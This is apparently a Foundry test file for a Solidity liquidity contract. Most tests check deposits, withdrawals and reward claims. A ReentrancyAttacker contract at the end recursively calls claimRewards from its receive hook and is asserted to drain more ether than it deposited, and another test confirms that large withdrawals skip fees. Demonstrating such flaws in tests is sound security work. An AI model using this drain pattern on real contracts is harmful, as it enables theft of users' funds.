// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/TokenLiquidityManager.sol";

contract TokenLiquidityManagerTest is Test {
    TokenLiquidityManager public tokenLiquidityManager;
    address public user = address(0x123);
    address public owner;

    function setUp() public {
        owner = address(this);
        tokenLiquidityManager = new TokenLiquidityManager();
        vm.roll(tokenLiquidityManager.tradingStartBlock());
    }

    function testDeposit() public {
        vm.deal(user, 1 ether);
        vm.startPrank(user);
        (bool success, ) = address(tokenLiquidityManager).call{value: 0.5 ether}("");
        assertTrue(success);
        assertEq(tokenLiquidityManager.getBalance(user), 0.5 ether);
        vm.stopPrank();
    }

    function testWithdrawFunds() public {
        vm.deal(user, 1 ether);
        vm.startPrank(user);
        (bool success, ) = address(tokenLiquidityManager).call{value: 0.5 ether}("");
        assertTrue(success);
        
        uint256 userBalanceBefore = user.balance;
        tokenLiquidityManager.withdrawFunds(0.25 ether);
        uint256 userBalanceAfter = user.balance;

        assertEq(tokenLiquidityManager.getBalance(user), 0.25 ether);
        assertTrue(userBalanceAfter > userBalanceBefore);
        vm.stopPrank();
    }

    function testClaimRewards() public {
        vm.deal(user, 1 ether);
        vm.startPrank(user);
        (bool success, ) = address(tokenLiquidityManager).call{value: 0.5 ether}("");
        assertTrue(success);

        tokenLiquidityManager.claimRewards(0.5 ether);
        assertEq(tokenLiquidityManager.getBalance(user), 0);
        vm.stopPrank();
    }

    function testWithdrawDuringWindow() public {
        vm.deal(user, 1 ether);
        vm.startPrank(user);
        (bool success, ) = address(tokenLiquidityManager).call{value: 0.5 ether}("");
        assertTrue(success);
        
        tokenLiquidityManager.withdrawDuringWindow(0.25 ether);
        assertEq(tokenLiquidityManager.getBalance(user), 0.25 ether);
        vm.stopPrank();
    }

    function testLargeWithdrawNoFees() public {
        // First, let's make a small deposit to establish initial pool liquidity
        vm.deal(address(this), 1 ether);
        (bool success, ) = address(tokenLiquidityManager).call{value: 1 ether}("");
        assertTrue(success);

        // Now set up the user for the test
        vm.deal(user, 5 ether);
        vm.startPrank(user);
        
        // Make a large deposit
        (success, ) = address(tokenLiquidityManager).call{value: 3 ether}("");
        assertTrue(success);
        
        // Calculate fees for a withdrawal that's more than half the pool
        uint256 poolLiquidity = tokenLiquidityManager.getLiquidityPool();
        uint256 largeAmount = (poolLiquidity * 51) / 100; // Just over 50% of pool
        uint256 fees = tokenLiquidityManager.calculateFees(largeAmount);
        
        assertEq(fees, 0, "Large withdrawal should have no fees");
        vm.stopPrank();
    }

    function testReentrancyVulnerability() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(tokenLiquidityManager);
        vm.deal(address(attacker), 1 ether);
        
        attacker.attack{value: 1 ether}();
        assertTrue(address(attacker).balance > 1 ether, "Attack should drain more than deposited");
    }
}

contract ReentrancyAttacker {
    TokenLiquidityManager public target;
    uint256 public attackAmount = 0.5 ether;
    uint256 public attackCount;

    constructor(TokenLiquidityManager _target) {
        target = _target;
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need funds to attack");
        
        // Initial deposit
        (bool success, ) = address(target).call{value: attackAmount}("");
        require(success, "Initial deposit failed");
        
        // Start the reentrancy attack
        target.claimRewards(attackAmount);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount && attackCount < 3) {
            attackCount++;
            target.claimRewards(attackAmount);
        }
    }
}